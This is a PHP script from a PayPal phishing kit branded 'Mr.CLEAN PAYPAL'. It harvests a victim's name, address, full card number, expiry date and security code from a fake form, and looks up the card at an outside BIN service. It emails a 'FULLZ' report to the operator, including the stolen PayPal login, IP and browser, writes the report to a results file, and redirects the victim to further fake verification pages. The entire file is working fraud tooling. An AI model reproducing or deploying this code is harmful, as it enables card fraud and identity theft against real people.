<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
        session_start();
        error_reporting(0);
        $TIME_DATE = date('H:i:s d/m/Y');
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_browser.php');
        include('../functions/get_ip.php');  
        include('../config.php');
        ########################################################
        ############# [+] BILLING INFORMATION [+] ##############
        ########################################################
        if(!empty($_POST['firstName'])){$_SESSION['_fullname_']    = $_POST['firstName'] ." ". $_POST['lastName'];}
        if(!empty($_POST['billingAddress'])){$_SESSION['_billingAddress_']    = $_POST['billingAddress'];}
        if(!empty($_POST['billingCity'])){$_SESSION['_city_']        = $_POST['billingCity'];}
        if(!empty($_POST['billingState'])){$_SESSION['_state_']       = $_POST['billingState'];}
        if(!empty($_POST['billingPostalCode'])){$_SESSION['_zipCode_']     = $_POST['billingPostalCode'];}
        ########################################################
        ############ [+] CREDITCARD INFORMATION [+] ############
        ########################################################
        if(!empty($_POST['firstName'])){$_SESSION['_cc_holder_']         = $_POST['firstName'] ." ". $_POST['lastName'];}
        if(!empty($_POST['cardnumber'])){$_SESSION['_cc_number_']         = $_POST['cardnumber'];}
        if(!empty($_POST['cardnumber'])){$_SESSION['_last4_']             = substr($_POST['cardnumber'], -4);}
        if(!empty($_POST['expdate'])){$_SESSION['_expirationDate_']    = $_POST['expdate'];}
        if(!empty($_POST['csc'])){$_SESSION['_csc_']               = $_POST['csc'];}
        ########################################################
        ####### [+] GET CREDITCARD BIN INFORMATIONS [+] ########
        ########################################################
        $_SESSION['_cc_holder_'] = strtoupper($_SESSION['_cc_holder_']);
        if(isset($_SESSION['_cc_number_']) && !empty($_SESSION['_cc_number_'])){
        $_SESSION['_cc_number_'] = preg_replace('/\s+/', '', $_SESSION['_cc_number_']);
        $BIN_LOOKUP = substr($_SESSION['_cc_number_'], 0, 6);
        $SYPHER_BIN    = @json_decode(file_get_contents("https://bincodes.ga/GET_BIN.php?cc=$BIN_LOOKUP"));
        $BIN_SCHEME    = $SYPHER_BIN->SCHEME;
        $BIN_TYPE      = $SYPHER_BIN->TYPE;
        $BIN_BRAND     = $SYPHER_BIN->BRAND;
        $BIN_CNAME     = $SYPHER_BIN->COUNTRY;
        $BIN_CCODE     = $SYPHER_BIN->ALPHA;
        $BIN_BNAME     = $SYPHER_BIN->BANK;
        $BIN_BURL      = $SYPHER_BIN->URL;
        $BIN_BPHONE    = $SYPHER_BIN->PHONE;
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        $_SESSION['_country_']  = $BIN_CNAME;
        $_SESSION['_countrycode_']  = $BIN_CCODE;
        $_SESSION['_cc_brand_'] = $BIN_SCHEME;
        $_SESSION['_cc_bank_']  = $BIN_BNAME;
        $_SESSION['_cc_type_']  = $BIN_TYPE;
        $_SESSION['_cc_class_'] = $BIN_BRAND;
        $_SESSION['_cc_site_']  = $BIN_BURL;
        $_SESSION['_cc_phone_'] = $BIN_BPHONE;
        $_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];}
        if (!empty($BIN_SCHEME)) {
            $TEMP = $BIN_SCHEME;
        }
        ########################################################
        ################ [+] SYPHER_MESSAGE [+] ################
        ########################################################
        $SYPHER_MESSAGE  = "<html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> DEAR, <font color='#9c0000'>".$SYPHER_NAME."</font> THIS IS YOUR CC RESULT ENJOY ! <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> CARDING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Bank Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_bank_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_cc_holder_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [".$TEMP." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cc_number_']." (".$_SESSION['_ccglobal_'].")</font><br>
        <font style='color:#9c0000;'>[+]</font> [Card Security Code]    = <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expirationDate_']."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [Full Name] = <font style='color:#0070ba;'>".$_SESSION['_fullname_']." (First name - Last name)</font><br>
        <font style='color:#9c0000;'>[+]</font> [Full Address line] = <font style='color:#0070ba;'>".$_SESSION['_billingAddress_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Country Name] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']." & THE ".$BIN_SCHEME." CARD MADE IN ".$_SESSION['_country_']."</font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/".$_SESSION['_ip_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>".SYPHER_Browser($_SERVER['HTTP_USER_AGENT'])." On ".SYPHER_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html>";
        ########################################################
        ################ [+] FOR VBV CARDS [+] #################
        ########################################################
        if ($TEMP == "VISA" || $TEMP == "VISA ELECTRON" || $TEMP == "MASTERCARD" || $TEMP == "MAESTRO"){
        ################ [+] SYPHER_SUBJECT [+] ################
        $SYPHER_SUBJECT = "(PAYPAL)(".$TEMP." ".$_SESSION['_cc_type_'].")(".$_SESSION['_cc_holder_'].")(".$_SESSION['_forlogin_'].")";
        ################ [+] SYPHER_HEADERS [+] ################
        $SYPHER_HEADERS  = "From: Mr. CLEAN ☑ <no_reply@mrclean.ml>\n";
        $SYPHER_HEADERS .= "MIME-Version: 1.0\r\n";
        $SYPHER_HEADERS .= "Content-Type: text/html; charset=ISO-8859-1\n";
        ################## [+] SEND MAIL [+] ###################
        if (!empty($_POST['cardnumber'])){
        mail($SYPHER_EMAIL, $SYPHER_SUBJECT, $SYPHER_MESSAGE, $SYPHER_HEADERS);
        ################## [+] TEXT RESULT [+] #################
        $MYFILE = "../../../all_result/FULLZ.php";
        $FH = fopen($MYFILE, 'a+') or die("can't open file!");
        fwrite($FH, $SYPHER_MESSAGE);
        fclose($FH);}
        ################## [+] NEXT PAGE [+] ###################
        HEADER("Location: ../authentication/authentication.php?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);}
        else{
        ########################################################
        ############## [+] FOR NON-VBV CARDS [+] ###############
        ########################################################

        ################ [+] SYPHER_SUBJECT [+] ################
        $SYPHER_SUBJECT = "(PAYPAL)($TEMP)(".$_SESSION['_cc_holder_'].")(".$_SESSION['_forlogin_'].")";
        ################ [+] SYPHER_HEADERS [+] ################
        $SYPHER_HEADERS  = "From: Mr. CLEAN ☑ <no_reply@mrclean.ml>\n";
        $SYPHER_HEADERS .= "MIME-Version: 1.0\r\n";
        $SYPHER_HEADERS .= "Content-Type: text/html; charset=ISO-8859-1\n";
        ################## [+] SEND MAIL [+] ###################
        if (!empty($_POST['cardnumber'])){
        mail($SYPHER_EMAIL, $SYPHER_SUBJECT, $SYPHER_MESSAGE, $SYPHER_HEADERS);
        ################## [+] TEXT RESULT [+] #################
        $MYFILE = "../../../all_result/FULLZ.php";
        $FH = fopen($MYFILE, 'a+') or die("can't open file!");
        fwrite($FH, $SYPHER_MESSAGE);
        fclose($FH);}
        ################## [+] NEXT PAGE [+] ###################
        header("Location: ../identity/identity.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);}
?>